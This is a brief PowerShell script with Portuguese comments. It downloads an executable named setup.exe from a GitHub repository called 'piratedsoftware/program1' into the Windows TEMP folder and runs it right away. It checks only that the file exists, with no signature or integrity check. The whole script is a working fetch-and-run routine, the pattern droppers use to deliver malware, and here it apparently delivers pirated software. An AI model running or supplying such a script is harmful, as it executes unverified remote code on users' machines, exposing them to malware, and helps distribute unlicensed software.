# URL do arquivo .exe a ser baixado
$url = "https://raw.githubusercontent.com/piratedsoftware/program1/main/setup.exe"

# Local onde o arquivo será salvo temporariamente
$tempFile = "$env:TEMP\setup.exe"

# Baixar o arquivo .exe
Invoke-WebRequest -Uri $url -OutFile $tempFile

# Verificar se o download foi bem-sucedido
if (Test-Path $tempFile) {
    # Executar o arquivo .exe
    Start-Process -FilePath $tempFile -Wait
} else {
    Write-Host "Falha ao baixar o arquivo."
}
